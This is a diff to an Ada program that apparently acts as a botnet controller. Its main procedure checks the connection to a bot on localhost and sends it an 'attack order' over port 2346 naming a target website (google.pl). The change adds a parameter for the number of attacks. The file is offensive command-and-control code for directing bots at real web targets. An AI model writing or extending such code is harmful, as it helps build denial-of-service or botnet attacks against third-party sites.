@@ -38,10 +38,11 @@ procedure main is
 	end check_bot_connection;
 
 
-	procedure attack_order (botAddress, targetURI: in String) is
+	procedure attack_order (botAddress, targetURI: in String; numberOfAttacks: in integer) is
 	begin
 		initiate_connection(botAddress, 2346);
 		String'Write(channel, targetURI);
+		String'Write(channel, Integer'Image(numberOfAttacks));
 		close_connection;
 	end attack_order;
 
@@ -51,11 +52,10 @@ begin
 	isSuccessful := check_bot_connection("127.0.0.1");
 	if(isSuccessful) then
 		put_line("Connected! Sending attack request!");
-		attack_order("127.0.0.1", "http://www.google.pl");
+		attack_order("127.0.0.1", "http://www.google.pl", 3);
 		put_line("Attack isSuccessful");
 	else
 		put_line("Not connected");
-		attack_order("127.0.0.1", "http://www.google.pl");
 	end if;
 
 end main;
